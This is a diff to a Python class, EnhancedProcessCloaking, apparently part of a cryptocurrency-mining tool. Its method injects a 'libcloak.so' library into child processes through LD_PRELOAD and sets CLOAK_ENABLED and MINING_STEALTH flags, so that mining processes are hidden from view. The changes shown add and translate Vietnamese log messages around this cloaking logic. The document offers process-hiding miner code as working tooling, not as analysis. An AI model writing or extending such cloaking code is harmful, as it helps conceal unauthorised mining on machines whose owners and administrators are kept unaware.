@@ -308,9 +308,11 @@ class EnhancedProcessCloaking:
             (), 
             {'env_keys': list(env.keys())}
         )
+        self.logger.info(f"Thiết lập môi trường tàng hình cho tiến trình con...")
         
         try:
             if not self.libcloak_available:
+                self.logger.warning(f"Thư viện tàng hình libcloak.so không tồn tại tại {LIBCLOAK_PATH}. Tiến trình con sẽ chạy không có tàng hình.")
                 self.audit_logger.log_activation_status(
                     "stealth_environment", 
                     "DISABLED", 
@@ -318,20 +320,26 @@ class EnhancedProcessCloaking:
                 )
                 return env
             
+            self.logger.info(f"Thư viện libcloak.so được tìm thấy. Sửa đổi biến môi trường LD_PRELOAD...")
             # Clone environment
             stealth_env = env.copy()
             original_env_size = len(env)
             
             # Add LD_PRELOAD for cloaking library
             ld_preload = stealth_env.get('LD_PRELOAD', '')
+            self.logger.debug(f"Giá trị LD_PRELOAD ban đầu: '{ld_preload}'")
+
             if ld_preload:
                 stealth_env['LD_PRELOAD'] = f"{LIBCLOAK_PATH}:{ld_preload}"
             else:
                 stealth_env['LD_PRELOAD'] = LIBCLOAK_PATH
             
+            self.logger.info(f"Giá trị LD_PRELOAD mới: '{stealth_env['LD_PRELOAD']}'")
+
             # Set stealth flags
             stealth_env['CLOAK_ENABLED'] = '1'
             stealth_env['MINING_STEALTH'] = '1'
+            self.logger.debug("Đã đặt các biến môi trường CLOAK_ENABLED=1 và MINING_STEALTH=1")
             
             # Log environment setup metrics
             env_metrics = {
@@ -345,7 +353,7 @@ class EnhancedProcessCloaking:
             self.audit_logger.log_performance_metrics("stealth_environment_setup", env_metrics)
             self.audit_logger.log_activation_status("stealth_environment", "ENABLED", env_metrics)
             
-            self.logger.info("✅ Stealth environment configured with LD_PRELOAD")
+            self.logger.info("✅ Môi trường tàng hình đã được cấu hình thành công cho tiến trình con.")
             return stealth_env
             
         except Exception as e:
@@ -355,7 +363,7 @@ class EnhancedProcessCloaking:
                 'execution_time': time.time() - start_time
             }
             self.audit_logger.log_error_with_context("setup_stealth_environment", e, error_context)
-            self.logger.error(f"❌ Error setting up stealth environment: {e}")
+            self.logger.error(f"❌ Lỗi nghiêm trọng khi thiết lập môi trường tàng hình: {e}", exc_info=True)
             return env
         
         finally:
